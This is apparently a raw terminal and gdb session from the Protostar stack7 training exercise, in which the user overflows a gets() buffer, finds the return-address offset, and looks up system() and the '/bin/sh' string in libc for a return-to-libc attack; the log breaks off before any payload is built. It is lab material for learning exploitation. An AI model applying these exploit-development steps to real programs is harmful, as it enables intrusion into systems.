 gdb ./stack7
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack7...done.
(gdb) set dis
disable-randomization  disassemble-next-line  disassembly-flavor     displaced-stepping     
(gdb) set disassembly-flavor intel 
(gdb) info functions
All defined functions:

File stack7/stack7.c:
char *getpath(void);
int main(int, char **);

Non-debugging symbols:
0x08048354  _init
0x08048394  __gmon_start__
0x08048394  __gmon_start__@plt
0x080483a4  gets
0x080483a4  gets@plt
0x080483b4  __libc_start_main
0x080483b4  __libc_start_main@plt
0x080483c4  _exit
0x080483c4  _exit@plt
0x080483d4  fflush
0x080483d4  fflush@plt
0x080483e4  printf
0x080483e4  printf@plt
0x080483f4  strdup
0x080483f4  strdup@plt
0x08048410  _start
0x08048440  __do_global_dtors_aux
0x080484a0  frame_dummy
0x08048560  __libc_csu_fini
0x08048570  __libc_csu_init
0x080485ca  __i686.get_pc_thunk.bx
0x080485d0  __do_global_ctors_aux
0x080485fc  _fini
(gdb) b *getpath
Breakpoint 1 at 0x80484c4: file stack7/stack7.c, line 7.
(gdb) r
Starting program: /opt/protostar/bin/stack7 

Breakpoint 1, getpath () at stack7/stack7.c:7
7       stack7/stack7.c: No such file or directory.
        in stack7/stack7.c
(gdb) info register
eax            0xbffff854       -1073743788
ecx            0x7d787ecf       2105048783
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff79c       0xbffff79c
ebp            0xbffff7a8       0xbffff7a8
esi            0x0      0
edi            0x0      0
eip            0x80484c4        0x80484c4 <getpath>
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x/i $esp
0xbffff79c:     push   eax
(gdb) x10w $esp
Undefined command: "x10w".  Try "help".
(gdb) x/10w $esp
0xbffff79c:     0x08048550      0x08048570      0x00000000      0xbffff828
0xbffff7ac:     0xb7eadc76      0x00000001      0xbffff854      0xbffff85c
0xbffff7bc:     0xb7fe1848      0xbffff810
(gdb) x/i $eip
0x80484c4 <getpath>:    push   ebp
(gdb) x/80 $esp
0xbffff79c:     push   eax
0xbffff79d:     test   DWORD PTR [eax+ecx*1],eax
0xbffff7a0:     jo     0xbffff727
0xbffff7a2:     add    al,0x8
0xbffff7a4:     add    BYTE PTR [eax],al
0xbffff7a6:     add    BYTE PTR [eax],al
0xbffff7a8:     sub    al,bh
0xbffff7aa:     (bad)  
0xbffff7ab:     mov    edi,0xb7eadc76
0xbffff7b0:     add    DWORD PTR [eax],eax
0xbffff7b2:     add    BYTE PTR [eax],al
0xbffff7b4:     push   esp
0xbffff7b5:     clc    
0xbffff7b6:     (bad)  
0xbffff7b7:     mov    edi,0xbffff85c
0xbffff7bc:     dec    eax
0xbffff7bd:     sbb    dh,bh
0xbffff7bf:     mov    bh,0x10
0xbffff7c1:     clc    
0xbffff7c2:     (bad)  
0xbffff7c3:     mov    edi,0xffffffff
0xbffff7c8:     hlt    
0xbffff7c9:     out    dx,eax
0xbffff7ca:     push   DWORD PTR [edi+0x80482bc]
0xbffff7d0:     add    DWORD PTR [eax],eax
0xbffff7d2:     add    BYTE PTR [eax],al
0xbffff7d4:     adc    al,bh
0xbffff7d6:     (bad)  
0xbffff7d7:     mov    edi,0xb7ff0626
0xbffff7dc:     mov    al,0xfa
0xbffff7de:     push   DWORD PTR [edi-0x4801e4d8]
0xbffff7e4:     hlt    
0xbffff7e5:     jg     0xbffff7e4
0xbffff7e7:     mov    bh,0x0
0xbffff7e9:     add    BYTE PTR [eax],al
0xbffff7eb:     add    BYTE PTR [eax],al
0xbffff7ed:     add    BYTE PTR [eax],al
0xbffff7ef:     add    BYTE PTR [eax],ch
0xbffff7f1:     clc    
0xbffff7f2:     (bad)  
0xbffff7f3:     mov    edi,0x572f68df
0xbffff7f8:     iret   
0xbffff7f9:     jle    0xbffff873
0xbffff7fb:     jge    0xbffff7fd
---Type <return> to continue, or q <return> to quit---
0xbffff7fd:     add    BYTE PTR [eax],al
0xbffff7ff:     add    BYTE PTR [eax],al
0xbffff801:     add    BYTE PTR [eax],al
0xbffff803:     add    BYTE PTR [eax],al
0xbffff805:     add    BYTE PTR [eax],al
0xbffff807:     add    BYTE PTR [ecx],al
0xbffff809:     add    BYTE PTR [eax],al
0xbffff80b:     add    BYTE PTR [eax],dl
0xbffff80d:     test   BYTE PTR [eax+ecx*1],al
0xbffff810:     add    BYTE PTR [eax],al
0xbffff812:     add    BYTE PTR [eax],al
0xbffff814:     adc    BYTE PTR [edx-0x1],ah
0xbffff817:     mov    bh,0x9b
0xbffff819:     fucomi st,st(2)
0xbffff81b:     mov    bh,0xf4
0xbffff81d:     out    dx,eax
0xbffff81e:     push   DWORD PTR [edi+0x1]
0xbffff824:     adc    BYTE PTR [esp+eax*1+0x8],al
0xbffff82b:     add    BYTE PTR [ecx],dh
0xbffff82d:     test   BYTE PTR [eax+ecx*1],al
0xbffff830:     inc    ebp
0xbffff831:     test   DWORD PTR [eax+ecx*1],eax
0xbffff834:     add    DWORD PTR [eax],eax
0xbffff836:     add    BYTE PTR [eax],al
0xbffff838:     push   esp
0xbffff839:     clc    
0xbffff83a:     (bad)  
0xbffff83b:     mov    edi,0x8048570
0xbffff840:     pusha  
0xbffff841:     test   DWORD PTR [eax+ecx*1],eax
0xbffff844:     inc    eax
0xbffff845:     adc    bh,bh
0xbffff847:     mov    bh,0x4c
0xbffff849:     clc    
0xbffff84a:     (bad)  
0xbffff84b:     mov    edi,0xb7fff8f8
(gdb) x/80w $esp
0xbffff79c:     0x08048550      0x08048570      0x00000000      0xbffff828
0xbffff7ac:     0xb7eadc76      0x00000001      0xbffff854      0xbffff85c
0xbffff7bc:     0xb7fe1848      0xbffff810      0xffffffff      0xb7ffeff4
0xbffff7cc:     0x080482bc      0x00000001      0xbffff810      0xb7ff0626
0xbffff7dc:     0xb7fffab0      0xb7fe1b28      0xb7fd7ff4      0x00000000
0xbffff7ec:     0x00000000      0xbffff828      0x572f68df      0x7d787ecf
0xbffff7fc:     0x00000000      0x00000000      0x00000000      0x00000001
0xbffff80c:     0x08048410      0x00000000      0xb7ff6210      0xb7eadb9b
0xbffff81c:     0xb7ffeff4      0x00000001      0x08048410      0x00000000
0xbffff82c:     0x08048431      0x08048545      0x00000001      0xbffff854
0xbffff83c:     0x08048570      0x08048560      0xb7ff1040      0xbffff84c
0xbffff84c:     0xb7fff8f8      0x00000001      0xbffff96f      0x00000000
0xbffff85c:     0xbffff989      0xbffff993      0xbffff9b4      0xbffff9c8
0xbffff86c:     0xbffff9d0      0xbffff9e2      0xbffff9f2      0xbffffa05
0xbffff87c:     0xbffffa12      0xbffffa21      0xbffffa2d      0xbffffa41
0xbffff88c:     0xbffffa7f      0xbffffa90      0xbfffff80      0xbfffff8e
0xbffff89c:     0xbfffffa5      0xbfffffd9      0x00000000      0x00000020
0xbffff8ac:     0xb7fe2414      0x00000021      0xb7fe2000      0x00000010
0xbffff8bc:     0x178bfbff      0x00000006      0x00001000      0x00000011
0xbffff8cc:     0x00000064      0x00000003      0x08048034      0x00000004
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>info register
>x/3i $eip
>x/80w $esp
>
>end
(gdb) x/s 0x080484ef
0x80484ef <getpath+43>:  "\213E\004\211E\364\213E\364%"
(gdb) disassemble getpath
Dump of assembler code for function getpath:
0x080484c4 <getpath+0>: push   ebp
0x080484c5 <getpath+1>: mov    ebp,esp
0x080484c7 <getpath+3>: sub    esp,0x68
0x080484ca <getpath+6>: mov    eax,0x8048620
0x080484cf <getpath+11>:        mov    DWORD PTR [esp],eax
0x080484d2 <getpath+14>:        call   0x80483e4 <printf@plt>
0x080484d7 <getpath+19>:        mov    eax,ds:0x8049780
0x080484dc <getpath+24>:        mov    DWORD PTR [esp],eax
0x080484df <getpath+27>:        call   0x80483d4 <fflush@plt>
0x080484e4 <getpath+32>:        lea    eax,[ebp-0x4c]
0x080484e7 <getpath+35>:        mov    DWORD PTR [esp],eax
0x080484ea <getpath+38>:        call   0x80483a4 <gets@plt>
0x080484ef <getpath+43>:        mov    eax,DWORD PTR [ebp+0x4]
0x080484f2 <getpath+46>:        mov    DWORD PTR [ebp-0xc],eax
0x080484f5 <getpath+49>:        mov    eax,DWORD PTR [ebp-0xc]
0x080484f8 <getpath+52>:        and    eax,0xb0000000
0x080484fd <getpath+57>:        cmp    eax,0xb0000000
0x08048502 <getpath+62>:        jne    0x8048524 <getpath+96>
0x08048504 <getpath+64>:        mov    eax,0x8048634
0x08048509 <getpath+69>:        mov    edx,DWORD PTR [ebp-0xc]
0x0804850c <getpath+72>:        mov    DWORD PTR [esp+0x4],edx
0x08048510 <getpath+76>:        mov    DWORD PTR [esp],eax
0x08048513 <getpath+79>:        call   0x80483e4 <printf@plt>
0x08048518 <getpath+84>:        mov    DWORD PTR [esp],0x1
0x0804851f <getpath+91>:        call   0x80483c4 <_exit@plt>
0x08048524 <getpath+96>:        mov    eax,0x8048640
0x08048529 <getpath+101>:       lea    edx,[ebp-0x4c]
0x0804852c <getpath+104>:       mov    DWORD PTR [esp+0x4],edx
0x08048530 <getpath+108>:       mov    DWORD PTR [esp],eax
0x08048533 <getpath+111>:       call   0x80483e4 <printf@plt>
0x08048538 <getpath+116>:       lea    eax,[ebp-0x4c]
0x0804853b <getpath+119>:       mov    DWORD PTR [esp],eax
0x0804853e <getpath+122>:       call   0x80483f4 <strdup@plt>
0x08048543 <getpath+127>:       leave  
0x08048544 <getpath+128>:       ret    
End of assembler dump.
(gdb) b *0x080484ef
Breakpoint 2 at 0x80484ef: file stack7/stack7.c, line 15.
(gdb) c
Continuing.
input path please: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
eax            0xbffff74c       -1073744052
ecx            0xbffff74c       -1073744052
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff730       0xbffff730
ebp            0xbffff798       0xbffff798
esi            0x0      0
edi            0x0      0
eip            0x80484ef        0x80484ef <getpath+43>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0x80484ef <getpath+43>: mov    eax,DWORD PTR [ebp+0x4]
0x80484f2 <getpath+46>: mov    DWORD PTR [ebp-0xc],eax
0x80484f5 <getpath+49>: mov    eax,DWORD PTR [ebp-0xc]
0xbffff730:     0xbffff74c      0x00000000      0xb7fe1b28      0x00000001
0xbffff740:     0x00000000      0x00000001      0xb7fff8f8      0x41414141
0xbffff750:     0x42424242      0x43434343      0x44444444      0x45454545
0xbffff760:     0x46464646      0x47474747      0x48484848      0x49494949
0xbffff770:     0x4a4a4a4a      0x4b4b4b4b      0x4c4c4c4c      0x4d4d4d4d
0xbffff780:     0x4e4e4e4e      0x4f4f4f4f      0x50505050      0x51515151
0xbffff790:     0x52525252      0x53535353      0x54545454      0x55555555
0xbffff7a0:     0x56565656      0x57575757      0x58585858      0x59595959
0xbffff7b0:     0x5a5a5a5a      0xbffff800      0xbffff85c      0xb7fe1848
0xbffff7c0:     0xbffff810      0xffffffff      0xb7ffeff4      0x080482bc
0xbffff7d0:     0x00000001      0xbffff810      0xb7ff0626      0xb7fffab0
0xbffff7e0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffff7f0:     0xbffff828      0x572f68df      0x7d787ecf      0x00000000
0xbffff800:     0x00000000      0x00000000      0x00000001      0x08048410
0xbffff810:     0x00000000      0xb7ff6210      0xb7eadb9b      0xb7ffeff4
0xbffff820:     0x00000001      0x08048410      0x00000000      0x08048431
0xbffff830:     0x08048545      0x00000001      0xbffff854      0x08048570
0xbffff840:     0x08048560      0xb7ff1040      0xbffff84c      0xb7fff8f8
0xbffff850:     0x00000001      0xbffff96f      0x00000000      0xbffff989
0xbffff860:     0xbffff993      0xbffff9b4      0xbffff9c8      0xbffff9d0

Breakpoint 2, getpath () at stack7/stack7.c:15
15      in stack7/stack7.c
(gdb) c
Continuing.
got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Program received signal SIGSEGV, Segmentation fault.
eax            0x804a008        134520840
ecx            0x0      0
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff7a0       0xbffff7a0
ebp            0x54545454       0x54545454
esi            0x0      0
edi            0x0      0
eip            0x55555555       0x55555555
eflags         0x210202 [ IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0x55555555:     Error while running hook_stop:
Cannot access memory at address 0x55555555
0x55555555 in ?? ()
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack7 
eax            0xbffff854       -1073743788
ecx            0x63722f9a       1668427674
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff79c       0xbffff79c
ebp            0xbffff7a8       0xbffff7a8
esi            0x0      0
edi            0x0      0
eip            0x80484c4        0x80484c4 <getpath>
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0x80484c4 <getpath>:    push   ebp
0x80484c5 <getpath+1>:  mov    ebp,esp
0x80484c7 <getpath+3>:  sub    esp,0x68
0xbffff79c:     0x08048550      0x08048570      0x00000000      0xbffff828
0xbffff7ac:     0xb7eadc76      0x00000001      0xbffff854      0xbffff85c
0xbffff7bc:     0xb7fe1848      0xbffff810      0xffffffff      0xb7ffeff4
0xbffff7cc:     0x080482bc      0x00000001      0xbffff810      0xb7ff0626
0xbffff7dc:     0xb7fffab0      0xb7fe1b28      0xb7fd7ff4      0x00000000
0xbffff7ec:     0x00000000      0xbffff828      0x4925398a      0x63722f9a
0xbffff7fc:     0x00000000      0x00000000      0x00000000      0x00000001
0xbffff80c:     0x08048410      0x00000000      0xb7ff6210      0xb7eadb9b
0xbffff81c:     0xb7ffeff4      0x00000001      0x08048410      0x00000000
0xbffff82c:     0x08048431      0x08048545      0x00000001      0xbffff854
0xbffff83c:     0x08048570      0x08048560      0xb7ff1040      0xbffff84c
0xbffff84c:     0xb7fff8f8      0x00000001      0xbffff96f      0x00000000
0xbffff85c:     0xbffff989      0xbffff993      0xbffff9b4      0xbffff9c8
0xbffff86c:     0xbffff9d0      0xbffff9e2      0xbffff9f2      0xbffffa05
0xbffff87c:     0xbffffa12      0xbffffa21      0xbffffa2d      0xbffffa41
0xbffff88c:     0xbffffa7f      0xbffffa90      0xbfffff80      0xbfffff8e
0xbffff89c:     0xbfffffa5      0xbfffffd9      0x00000000      0x00000020
0xbffff8ac:     0xb7fe2414      0x00000021      0xb7fe2000      0x00000010
0xbffff8bc:     0x178bfbff      0x00000006      0x00001000      0x00000011
0xbffff8cc:     0x00000064      0x00000003      0x08048034      0x00000004

Breakpoint 1, getpath () at stack7/stack7.c:7
7       in stack7/stack7.c
(gdb) 
(gdb) c
Continuing.
input path please: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
eax            0xbffff74c       -1073744052
ecx            0xbffff74c       -1073744052
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff730       0xbffff730
ebp            0xbffff798       0xbffff798
esi            0x0      0
edi            0x0      0
eip            0x80484ef        0x80484ef <getpath+43>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0x80484ef <getpath+43>: mov    eax,DWORD PTR [ebp+0x4]
0x80484f2 <getpath+46>: mov    DWORD PTR [ebp-0xc],eax
0x80484f5 <getpath+49>: mov    eax,DWORD PTR [ebp-0xc]
0xbffff730:     0xbffff74c      0x00000000      0xb7fe1b28      0x00000001
0xbffff740:     0x00000000      0x00000001      0xb7fff8f8      0x41414141
0xbffff750:     0x42424242      0x43434343      0x44444444      0x45454545
0xbffff760:     0x46464646      0x47474747      0x48484848      0x49494949
0xbffff770:     0x4a4a4a4a      0x4b4b4b4b      0x4c4c4c4c      0x4d4d4d4d
0xbffff780:     0x4e4e4e4e      0x4f4f4f4f      0x50505050      0x51515151
0xbffff790:     0x52525252      0x53535353      0x54545454      0x55555555
0xbffff7a0:     0x56565656      0x57575757      0x58585858      0x59595959
0xbffff7b0:     0x5a5a5a5a      0xbffff800      0xbffff85c      0xb7fe1848
0xbffff7c0:     0xbffff810      0xffffffff      0xb7ffeff4      0x080482bc
0xbffff7d0:     0x00000001      0xbffff810      0xb7ff0626      0xb7fffab0
0xbffff7e0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffff7f0:     0xbffff828      0x4925398a      0x63722f9a      0x00000000
0xbffff800:     0x00000000      0x00000000      0x00000001      0x08048410
0xbffff810:     0x00000000      0xb7ff6210      0xb7eadb9b      0xb7ffeff4
0xbffff820:     0x00000001      0x08048410      0x00000000      0x08048431
0xbffff830:     0x08048545      0x00000001      0xbffff854      0x08048570
0xbffff840:     0x08048560      0xb7ff1040      0xbffff84c      0xb7fff8f8
0xbffff850:     0x00000001      0xbffff96f      0x00000000      0xbffff989
0xbffff860:     0xbffff993      0xbffff9b4      0xbffff9c8      0xbffff9d0

Breakpoint 2, getpath () at stack7/stack7.c:15
15      in stack7/stack7.c
(gdb) c
Continuing.
got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Program received signal SIGSEGV, Segmentation fault.
eax            0x804a008        134520840
ecx            0x0      0
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff7a0       0xbffff7a0
ebp            0x54545454       0x54545454
esi            0x0      0
edi            0x0      0
eip            0x55555555       0x55555555
eflags         0x210202 [ IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0x55555555:     Error while running hook_stop:
Cannot access memory at address 0x55555555
0x55555555 in ?? ()
(gdb) 
Continuing.

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
Error while running hook_stop:
The program has no registers now.
(gdb) 
The program is not being run.
(gdb) 
The program is not being run.
(gdb) find address of libc                    <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,
No symbol "address" in current context.
(gdb) and system <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
Undefined command: "and".  Try "help".
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <system>
(gdb) Now let’s find where libc is loaded in memory:
Undefined command: "Now".  Try "help".
(gdb)  info proc map
No current process: you must name one.
(gdb) info proc map
No current process: you must name one.
(gdb) r
Starting program: /opt/protostar/bin/stack7 
eax            0xbffff854       -1073743788
ecx            0x97302ffb       -1758449669
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff79c       0xbffff79c
ebp            0xbffff7a8       0xbffff7a8
esi            0x0      0
edi            0x0      0
eip            0x80484c4        0x80484c4 <getpath>
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0x80484c4 <getpath>:    push   ebp
0x80484c5 <getpath+1>:  mov    ebp,esp
0x80484c7 <getpath+3>:  sub    esp,0x68
0xbffff79c:     0x08048550      0x08048570      0x00000000      0xbffff828
0xbffff7ac:     0xb7eadc76      0x00000001      0xbffff854      0xbffff85c
0xbffff7bc:     0xb7fe1848      0xbffff810      0xffffffff      0xb7ffeff4
0xbffff7cc:     0x080482bc      0x00000001      0xbffff810      0xb7ff0626
0xbffff7dc:     0xb7fffab0      0xb7fe1b28      0xb7fd7ff4      0x00000000
0xbffff7ec:     0x00000000      0xbffff828      0xbd6739eb      0x97302ffb
0xbffff7fc:     0x00000000      0x00000000      0x00000000      0x00000001
0xbffff80c:     0x08048410      0x00000000      0xb7ff6210      0xb7eadb9b
0xbffff81c:     0xb7ffeff4      0x00000001      0x08048410      0x00000000
0xbffff82c:     0x08048431      0x08048545      0x00000001      0xbffff854
0xbffff83c:     0x08048570      0x08048560      0xb7ff1040      0xbffff84c
0xbffff84c:     0xb7fff8f8      0x00000001      0xbffff96f      0x00000000
0xbffff85c:     0xbffff989      0xbffff993      0xbffff9b4      0xbffff9c8
0xbffff86c:     0xbffff9d0      0xbffff9e2      0xbffff9f2      0xbffffa05
0xbffff87c:     0xbffffa12      0xbffffa21      0xbffffa2d      0xbffffa41
0xbffff88c:     0xbffffa7f      0xbffffa90      0xbfffff80      0xbfffff8e
0xbffff89c:     0xbfffffa5      0xbfffffd9      0x00000000      0x00000020
0xbffff8ac:     0xb7fe2414      0x00000021      0xb7fe2000      0x00000010
0xbffff8bc:     0x178bfbff      0x00000006      0x00001000      0x00000011
0xbffff8cc:     0x00000064      0x00000003      0x08048034      0x00000004

Breakpoint 1, getpath () at stack7/stack7.c:7
7       in stack7/stack7.c
(gdb) info proc map
process 1786
cmdline = '/opt/protostar/bin/stack7'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack7'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack7
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack7
        0xb7e96000 0xb7e97000     0x1000          0        
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0        
        0xb7fe0000 0xb7fe2000     0x2000          0        
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) add is 0xb7e97000        <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
Ambiguous command "add is 0xb7e97000        <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<": add-symbol-file, add-symbol-file-from-memory.
(gdb) As it happens, “/bin/sh” string is also present in libc. Let’s try to use GDB’s find command to locate it:
Undefined command: "As".  Try "help".
(gdb) find 0xb7e97000, +9999999, "/bin/sh"
0xb7fba23f
warning: Unable to access target memory at 0xb7fd9647, halting search.
1 pattern found.
(gdb) got add of /bin/sh 0xb7fba23f
Undefined command: "got".  Try "help".
(gdb) x/s *0xb7fba23f
0x444e494b:      <Address 0x444e494b out of bounds>
(gdb) x/s *0xb7fba23f
0x444e494b:      <Address 0x444e494b out of bounds>
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack7 
eax            0xbffff854       -1073743788
ecx            0x21eef1c4       569307588
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff79c       0xbffff79c
ebp            0xbffff7a8       0xbffff7a8
esi            0x0      0
edi            0x0      0
eip            0x80484c4        0x80484c4 <getpath>
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0x80484c4 <getpath>:    push   ebp
0x80484c5 <getpath+1>:  mov    ebp,esp
0x80484c7 <getpath+3>:  sub    esp,0x68
0xbffff79c:     0x08048550      0x08048570      0x00000000      0xbffff828
0xbffff7ac:     0xb7eadc76      0x00000001      0xbffff854      0xbffff85c
0xbffff7bc:     0xb7fe1848      0xbffff810      0xffffffff      0xb7ffeff4
0xbffff7cc:     0x080482bc      0x00000001      0xbffff810      0xb7ff0626
0xbffff7dc:     0xb7fffab0      0xb7fe1b28      0xb7fd7ff4      0x00000000
0xbffff7ec:     0x00000000      0xbffff828      0x0bb9e7d4      0x21eef1c4
0xbffff7fc:     0x00000000      0x00000000      0x00000000      0x00000001
0xbffff80c:     0x08048410      0x00000000      0xb7ff6210      0xb7eadb9b
0xbffff81c:     0xb7ffeff4      0x00000001      0x08048410      0x00000000
0xbffff82c:     0x08048431      0x08048545      0x00000001      0xbffff854
0xbffff83c:     0x08048570      0x08048560      0xb7ff1040      0xbffff84c
0xbffff84c:     0xb7fff8f8      0x00000001      0xbffff96f      0x00000000
0xbffff85c:     0xbffff989      0xbffff993      0xbffff9b4      0xbffff9c8
0xbffff86c:     0xbffff9d0      0xbffff9e2      0xbffff9f2      0xbffffa05
0xbffff87c:     0xbffffa12      0xbffffa21      0xbffffa2d      0xbffffa41
0xbffff88c:     0xbffffa7f      0xbffffa90      0xbfffff80      0xbfffff8e
0xbffff89c:     0xbfffffa5      0xbfffffd9      0x00000000      0x00000020
0xbffff8ac:     0xb7fe2414      0x00000021      0xb7fe2000      0x00000010
0xbffff8bc:     0x178bfbff      0x00000006      0x00001000      0x00000011
0xbffff8cc:     0x00000064      0x00000003      0x08048034      0x00000004

Breakpoint 1, getpath () at stack7/stack7.c:7
7       in stack7/stack7.c
(gdb) x/s *0xb7fba23f
0x444e494b:      <Address 0x444e494b out of bounds>
(gdb) what what what no ..............
No symbol "what" in current context.
(gdb) ^Z
[1]+  Stopped                 gdb ./stack7
user@protostar:/opt/protostar/bin$ secon way to find the /bin/sh
bash: secon: command not found
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ strings -a -t x /lib/libc-2.11.2.so | grep /bin/sh
strings: error while loading shared libraries: /usr/lib/libbfd-2.20.1-system.20100303.so: cannot read file data: Input/output error
user@protostar:/opt/protostar/bin$ fuck this sucks it error is bcz os can not get proper from the hardware
bash: fuck: command not found
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 11f3bf /bin/sh
bash: 11f3bf: command not found
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ add is 113bf in libc 
bash: add: command not found
user@protostar:/opt/protostar/bin$ so /bin/sh in memory is 113bf+0xb7e97000 = 0xb7fb63bf
bash: so: command not found
user@protostar:/opt/protostar/bin$ gdb ./stack7
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack7...done.
(gdb) r
Starting program: /opt/protostar/bin/stack7 
input path please: ^Z
Program received signal SIGTSTP, Stopped (user).
0xb7f53c1e in read () from /lib/libc.so.6
(gdb) b getpath
Breakpoint 1 at 0x80484ca: file stack7/stack7.c, line 11.
(gdb) disassemble getpath
Dump of assembler code for function getpath:
0x080484c4 <getpath+0>: push   %ebp
0x080484c5 <getpath+1>: mov    %esp,%ebp
0x080484c7 <getpath+3>: sub    $0x68,%esp
0x080484ca <getpath+6>: mov    $0x8048620,%eax
0x080484cf <getpath+11>:        mov    %eax,(%esp)
0x080484d2 <getpath+14>:        call   0x80483e4 <printf@plt>
0x080484d7 <getpath+19>:        mov    0x8049780,%eax
0x080484dc <getpath+24>:        mov    %eax,(%esp)
0x080484df <getpath+27>:        call   0x80483d4 <fflush@plt>
0x080484e4 <getpath+32>:        lea    -0x4c(%ebp),%eax
0x080484e7 <getpath+35>:        mov    %eax,(%esp)
0x080484ea <getpath+38>:        call   0x80483a4 <gets@plt>
0x080484ef <getpath+43>:        mov    0x4(%ebp),%eax
0x080484f2 <getpath+46>:        mov    %eax,-0xc(%ebp)
0x080484f5 <getpath+49>:        mov    -0xc(%ebp),%eax
0x080484f8 <getpath+52>:        and    $0xb0000000,%eax
0x080484fd <getpath+57>:        cmp    $0xb0000000,%eax
0x08048502 <getpath+62>:        jne    0x8048524 <getpath+96>
0x08048504 <getpath+64>:        mov    $0x8048634,%eax
0x08048509 <getpath+69>:        mov    -0xc(%ebp),%edx
0x0804850c <getpath+72>:        mov    %edx,0x4(%esp)
0x08048510 <getpath+76>:        mov    %eax,(%esp)
0x08048513 <getpath+79>:        call   0x80483e4 <printf@plt>
0x08048518 <getpath+84>:        movl   $0x1,(%esp)
0x0804851f <getpath+91>:        call   0x80483c4 <_exit@plt>
